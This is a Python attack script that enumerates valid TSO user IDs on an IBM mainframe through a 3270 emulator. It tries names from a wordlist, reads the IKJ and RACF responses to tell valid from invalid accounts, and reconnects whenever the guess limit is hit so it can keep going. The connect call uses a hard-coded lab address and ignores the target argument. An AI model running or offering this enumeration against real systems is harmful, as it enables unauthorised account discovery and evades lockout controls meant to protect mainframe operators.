from py3270 import Emulator
import sys
import time

if len(sys.argv) <= 2:
	print("Usage: tsoUserEnum.py <target> <path to user list>")
	sys.exit()

target = sys.argv[1]
user_list_location = sys.argv[2]

def file2list(filename):
	lines = []
	with open(filename) as file:
    		lines = file.readlines()
    		lines = [line.rstrip() for line in lines]
	return lines
	
def user_enum(count, users, number_of_users):
	# use x3270 so you can see what is going on
	#em = Emulator(visible=True)

	# or not (uses s3270)
	em = Emulator()

	# connect to target
	em.connect('192.168.56.21:2323')
	#print("[i] Connected to target")
	time.sleep(1)

	# enter 'tso' at the VTAM prompt
	em.fill_field(21, 22, 'tso', 3)
	time.sleep(1)
	em.send_enter()
	
	# user enumeration loop
	while count < number_of_users:
		time.sleep(1)
		em.send_string(users[count], None, None)
		time.sleep(1)
		em.send_enter()
		# check for IKJ56420I message
		message = em.string_get(2,2, 9)
		#print("[i] Message: ", message)
		if em.string_found(2, 2, 'IKJ56420I'):
			#print("[-] User: " + users[count] + " is not valid")
			None
		elif em.string_found(2, 2, 'IKJ56428I'):
			print("[i] Guesses exceeded, logging back in")
			em.terminate()
			return count  
		elif em.string_found(4, 53, 'RACF'):
			print("[" + str(count+1) + "] User: " + users[count] + " is valid")
			#print("[i] Logging back in")
			em.terminate()
			count += 1
			return count  
		else:
			#print("[-] User: " + users[count] + " is not valid")
			None
		count += 1
		print("["+str(count)+"]")
	# disconnect from host and kill subprocess
	em.terminate()
	return count

# define a list of users
users = file2list(user_list_location)
number_of_users = len(users)

progress = 0

print("[i] Attempting to enumerate " + str(number_of_users) + " users")

while progress < number_of_users:
	progress = user_enum(progress, users, number_of_users)
	#print(progress)
 

